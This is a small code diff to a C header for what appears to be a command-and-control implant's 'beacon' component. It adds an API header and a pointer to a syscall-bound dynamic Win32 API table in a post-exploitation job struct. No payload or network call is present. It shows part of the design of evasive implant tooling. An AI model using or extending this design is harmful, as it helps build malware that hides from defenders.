@@ -2,6 +2,7 @@
 
 #include "beacon_common.h"
 #include "beacon_packet.h"
+#include "beacon_api.h"
 
 struct BeaconContext;
 
@@ -35,6 +36,7 @@ typedef struct PostExJob {
     UINT32 idle_timeout_ms;
     UINT32 cancel_reason;
     BOOL cancel_requested;
+    const Win32Api* api;             /* 动态 API 表（syscall 绑定后的槽位） */
     struct PostExJob* next;
 } PostExJob;
 
